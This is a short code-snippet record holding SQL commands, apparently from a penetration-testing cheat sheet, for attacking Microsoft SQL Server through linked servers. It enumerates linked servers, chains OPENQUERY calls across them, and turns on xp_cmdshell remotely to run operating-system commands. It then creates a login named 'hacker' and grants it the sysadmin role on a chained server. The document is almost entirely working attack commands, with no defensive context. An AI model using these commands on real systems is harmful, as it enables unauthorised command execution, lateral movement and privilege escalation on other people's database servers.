---
id: 451d5df5-fb7d-4b14-979a-2b863839bfd3
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:20.034526+00:00'
updated_at: '2023-04-10T20:36:34.688875+00:00'
---

# Code Snippet 451d5df5

**Language**: SQL

```sql
-- Execute query through the link
SELECT * FROM OPENQUERY("dcorp-sql1", 'SELECT * FROM master..sysservers')
SELECT version FROM OPENQUERY("linkedserver", 'SELECT @@version AS version');

-- Chain multiple openquery
SELECT version FROM OPENQUERY("link1",'SELECT version FROM OPENQUERY("link2","SELECT @@version AS version")')

-- Execute shell commands
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
SELECT 1 FROM OPENQUERY("linkedserver",'SELECT 1;EXEC master..xp_cmdshell "dir c:"')

-- Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
